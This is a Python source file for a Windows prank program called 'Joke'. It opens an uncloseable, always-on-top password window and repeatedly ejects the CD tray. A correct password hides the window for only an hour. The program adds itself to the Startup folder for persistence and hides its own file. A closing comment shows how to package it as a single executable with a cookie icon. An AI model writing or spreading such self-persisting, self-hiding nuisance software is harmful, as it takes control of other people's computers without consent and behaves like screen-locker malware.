import locale
import ctypes
import os
import sys
import winshell
from win32com.client import Dispatch
from subprocess import call
from tkinter import Tk, Entry, Label
from some_data import image, rus, eng
from time import sleep

root = Tk()


class Joke:

    def __init__(self):
        self.cd_status = False
        lang = locale.windows_locale[ctypes.windll.kernel32.GetUserDefaultUILanguage()]
        if lang == 'ru_RU' or lang == 'uk_UA':
            self.password = rus[0]
            self.text = rus[1]
        else:
            self.password = eng[0]
            self.text = eng[1]
        root.configure(background='#1c1c1c')
        self.entry = Entry(root, font='Arial 15', fg='black')
        self.entry.place(width=250, height=30, relx=0.5, rely=0.8, x=-30)
        label_0 = Label(root, text=image, font='Arial 5', fg='green', background='#1c1c1c')
        label_0.grid(row=0, column=0)
        label_1 = Label(root, text=self.text, font='Arial 30', fg='green', background='#1c1c1c')
        label_1.place(relx=0.4, rely=0.2, x=-20, y=40)
        self.create_shortcut()

    def window(self):
        root.geometry('500x250+200+100')
        root.attributes('-topmost', 1)
        root.wm_overrideredirect(True)
        root.protocol('WM_DELETE_WINDOW')
        if not self.cd_status:
            ctypes.windll.WINMM.mciSendStringW(u"set cdaudio door open", None, 0, None)
            self.cd_status = True
        root.update()
        root.bind('<Return>', self.check_password)

    def check_password(self, event):
        if self.entry.get().lower() == self.password:
            ctypes.windll.WINMM.mciSendStringW(u"set cdaudio door closed", None, 0, None)
            self.cd_status = False
            root.withdraw()
            self.entry.delete(0, 'end')
            sleep(3600)
            root.deiconify()

    def create_shortcut(self):
        full_path_to_file = os.path.abspath(sys.argv[0])
        file_name = os.path.basename(full_path_to_file)
        start = winshell.startup()
        path = os.path.join(start, f'{file_name.split(".")[0]}.lnk')
        target = full_path_to_file
        wDir = os.getcwd()
        icon = full_path_to_file
        shell = Dispatch('WScript.Shell')
        shortcut = shell.CreateShortCut(path)
        shortcut.Targetpath = target
        shortcut.WorkingDirectory = wDir
        shortcut.IconLocation = icon
        shortcut.save()
        call(['attrib', '+h', file_name])


if __name__ == '__main__':
    app = Joke()
    while True:
        app.window()
# pyinstaller -F -w -i "cookie.ico" cookie.py

